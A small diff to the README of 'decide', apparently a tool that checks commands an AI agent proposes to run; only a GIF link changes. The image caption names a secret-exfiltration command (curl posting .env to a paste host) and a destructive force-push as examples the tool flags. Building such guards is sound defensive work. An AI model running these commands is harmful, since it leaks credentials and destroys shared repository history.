@@ -18,7 +18,7 @@ answers with probabilities.**
 [quickstart](https://decide.deepnoodle.ai/start/), [tutorials](https://decide.deepnoodle.ai/tutorials/check-agent-commands/),
 and the [reference](https://decide.deepnoodle.ai/reference/).
 
-[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-0701f3df2e77.gif)](https://decide.deepnoodle.ai)
+[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-9d19d0263961.gif)](https://decide.deepnoodle.ai)
 
 ```sh
 brew install deepnoodle-ai/tap/decide
